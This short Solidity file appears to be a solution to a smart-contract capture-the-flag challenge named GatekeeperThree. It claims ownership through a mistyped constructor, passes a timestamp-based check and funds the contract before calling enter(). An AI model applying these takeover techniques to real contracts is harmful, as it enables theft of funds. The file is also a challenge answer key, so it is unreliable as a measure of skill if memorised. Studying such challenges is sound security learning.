// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./GatekeeperThree.sol";

function playerScript(address instanceAddress) {
    new GatekeeperThreeExploit().exploit{value: 0.001 ether + 1}(instanceAddress);
}

contract GatekeeperThreeExploit {
    function exploit(address instanceAddress) public payable {
        GatekeeperThree instance = GatekeeperThree(payable(instanceAddress));
        instance.createTrick();

        // gateTwo
        instance.getAllowance(block.timestamp);

        // gateThree
        instance.construct0r();
        payable(instanceAddress).call{value: 0.001 ether + 1}("");

        instance.enter();
    }
}
